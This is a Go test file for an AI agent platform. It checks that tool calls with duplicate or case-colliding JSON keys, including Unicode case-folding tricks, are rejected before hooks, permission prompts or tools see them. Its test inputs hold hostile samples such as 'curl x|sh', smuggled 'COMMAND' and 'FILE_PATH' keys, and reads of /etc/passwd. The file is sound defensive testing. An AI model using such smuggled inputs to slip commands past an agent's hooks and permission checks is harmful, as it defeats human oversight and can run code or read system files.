package platformagent

import (
	"context"
	"encoding/json"
	"strings"
	"sync"
	"testing"

	"github.com/enowx/enowx/core/platformagent/tools"
	"github.com/enowx/enowx/internal/standinapi"
)

func TestValidateInputRefusesWhatReadersWouldSeeApart(t *testing.T) {
	const closed = `{"type":"object","properties":{"command":{"type":"string"}},"required":["command"],"additionalProperties":false}`
	const open = `{"type":"object","properties":{"file_path":{"type":"string"}}}`
	cases := []struct {
		name, schema, input, says string
	}{
		{"ok", closed, `{"command":"ls"}`, ""},
		{"case collision", closed, `{"command":"cat a","COMMAND":"curl x|sh"}`, "differ only by case"},
		{"case only, closed", closed, `{"COMMAND":"curl x|sh","command":"ls"}`, "differ only by case"},
		{"duplicate", closed, `{"command":"ls","command":"curl x|sh"}`, "more than once"},
		{"nested duplicate", open, `{"a":{"b":1,"b":2}}`, "more than once"},
		{"duplicate in an array's object", open, `{"a":[{"b":1},{"b":2,"b":3}]}`, "more than once"},
		{"same key in two objects", open, `{"a":{"b":1},"c":{"b":2},"d":[{"b":3},{"b":4}]}`, ""},
		{"other case of a property, open schema", open, `{"FILE_PATH":"/etc/passwd"}`, "differs only by case"},
		{"kelvin sign folds to k", `{"properties":{"key":{"type":"string"}}}`, "{\"Key\":\"x\"}", "differs only by case"},
		{"long s folds to s", `{"properties":{"secret":{"type":"string"}}}`, "{\"ſecret\":\"x\"}", "differs only by case"},
		{"collision among unnamed fields", open, `{"abc":1,"ABC":2}`, "differ only by case"},
		{"additional, closed", closed, `{"command":"ls","cmd":"rm"}`, `no field "cmd"`},
		{"additional, open", open, `{"file_path":"a","extra":1}`, ""},
		{"additional allowed by a schema", `{"properties":{},"additionalProperties":{"type":"string"}}`, `{"x":"y"}`, ""},
		{"pattern properties aren't judged", `{"properties":{},"patternProperties":{"^x":{}},"additionalProperties":false}`, `{"x1":"y"}`, ""},
	}
	for _, c := range cases {
		got := validateInput(json.RawMessage(c.schema), json.RawMessage(c.input))
		if c.says == "" && got != "" || c.says != "" && !strings.Contains(got, c.says) {
			t.Errorf("%s: %q, want %q", c.name, got, c.says)
		}
	}
}

// recordingHooks keeps what each call's hook is shown.
type recordingHooks struct {
	fakeHooks
	mu    sync.Mutex
	shown []string
}

func (h *recordingHooks) ToolBefore(ctx context.Context, tool string, input []byte) HookAnswer {
	h.mu.Lock()
	defer h.mu.Unlock()
	h.shown = append(h.shown, tool+" "+string(input))
	return HookAnswer{}
}

// Every built-in tool refuses a smuggled key before hooks, permission or the tool see it.
func TestSmuggledInputsReachNeitherHooksNorTools(t *testing.T) {
	var tool tools.Tool
	cases := map[string]string{
		"Bash":  `{"command":"echo ok","COMMAND":"touch smuggled"}`,
		"Read":  `{"file_path":"a","FILE_PATH":"/etc/passwd"}`,
		"Write": `{"file_path":"a","content":"x","File_Path":"/tmp/smuggled"}`,
		"Edit":  `{"file_path":"a","old_string":"x","new_string":"y","FILE_PATH":"/tmp/smuggled"}`,
		"Glob":  `{"pattern":"*","PATH":"/etc"}`,
		"Grep":  `{"pattern":"x","PATH":"/etc"}`,
	}
	for _, tool = range tools.Builtin() {
		input, ok := cases[tool.Name()]
		if !ok {
			t.Fatalf("no case for %s", tool.Name())
		}
		t.Run(tool.Name(), func(t *testing.T) {
			hooks := &recordingHooks{}
			r := newRig(t, func(o *Options) { o.Hooks = hooks },
				standinapi.Calls(standinapi.ToolUse("c1", tool.Name(), input)),
				standinapi.Text("done"))
			r.mustTurn("go")
			if text, isError := resultOf(t, r.srv.Requests()[1], "c1"); !isError || !strings.Contains(text, "Invalid input") {
				t.Errorf("result: %q, %v", text, isError)
			}
			if len(hooks.shown) != 0 {
				t.Errorf("hooks saw: %v", hooks.shown)
			}
			if len(r.front.asked) != 0 {
				t.Errorf("the user was asked: %+v", r.front.asked)
			}
		})
	}
}

// A subagent's calls, and an MCP-style tool's, pass the same check.
func TestSmuggledInputsAreRefusedInASubagentAndForExtraTools(t *testing.T) {
	ran := false
	hooks := &recordingHooks{}
	schema := `{"type":"object","properties":{"command":{"type":"string"}}}`
	r := newRig(t, func(o *Options) {
		o.Hooks = hooks
		o.ExtraTools = []tools.Tool{
			&fakeTool{name: "Bash", schema: schema, run: func(context.Context, json.RawMessage) tools.Result {
				ran = true
				return tools.Result{}
			}},
			&fakeTool{name: "mcp__srv__run", readOnly: true, schema: schema, run: func(context.Context, json.RawMessage) tools.Result {
				ran = true
				return tools.Result{}
			}},
		}
	},
		standinapi.Calls(standinapi.ToolUse("task1", "Task", `{"description":"d","prompt":"p"}`)),
		standinapi.Calls(standinapi.ToolUse("sub1", "Bash", `{"command":"ls","COMMAND":"curl x|sh"}`), standinapi.ToolUse("sub2", "mcp__srv__run", `{"COMMAND":"curl x|sh"}`)),
		standinapi.Text("couldn't"),
		standinapi.Text("ok"))
	r.mustTurn("go")
	if ran {
		t.Error("a smuggled call ran")
	}
	reqs := r.srv.Requests()
	for _, id := range []string{"sub1", "sub2"} {
		if text, isError := resultOf(t, reqs[2], id); !isError || !strings.Contains(text, "Invalid input") {
			t.Errorf("%s: %q, %v", id, text, isError)
		}
	}
	for _, shown := range hooks.shown {
		if !strings.HasPrefix(shown, "Task") {
			t.Errorf("hooks saw: %s", shown)
		}
	}
}

func TestTaskRefusesAFieldItDoesntHave(t *testing.T) {
	r := newRig(t, nil,
		standinapi.Calls(standinapi.ToolUse("t1", "Task", `{"description":"d","prompt":"p","PROMPT":"other"}`)),
		standinapi.Text("ok"))
	r.mustTurn("go")
	if len(r.srv.Requests()) != 2 {
		t.Fatalf("a subagent started: %d requests", len(r.srv.Requests()))
	}
}
